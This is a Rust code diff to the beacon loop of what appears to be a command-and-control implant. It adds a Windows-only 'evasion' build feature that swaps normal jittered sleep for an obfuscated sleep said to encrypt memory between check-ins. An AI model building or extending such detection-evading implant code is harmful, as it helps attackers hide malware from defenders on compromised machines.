@@ -208,6 +208,15 @@ pub fn run(config: Arc<Config>) {
         // 10. Sleep with jitter
         checkin_count += 1;
         let sleep_duration = helpers::sleep_with_jitter(config.get_sleep(), config.get_jitter());
-        std::thread::sleep(std::time::Duration::from_secs(sleep_duration));
+
+        // Use obfuscated sleep when evasion is enabled (encrypts memory during sleep)
+        #[cfg(all(target_os = "windows", feature = "evasion"))]
+        {
+            crate::utils::evasion::obfuscated_sleep(sleep_duration * 1000);
+        }
+        #[cfg(not(all(target_os = "windows", feature = "evasion")))]
+        {
+            std::thread::sleep(std::time::Duration::from_secs(sleep_duration));
+        }
     }
 }
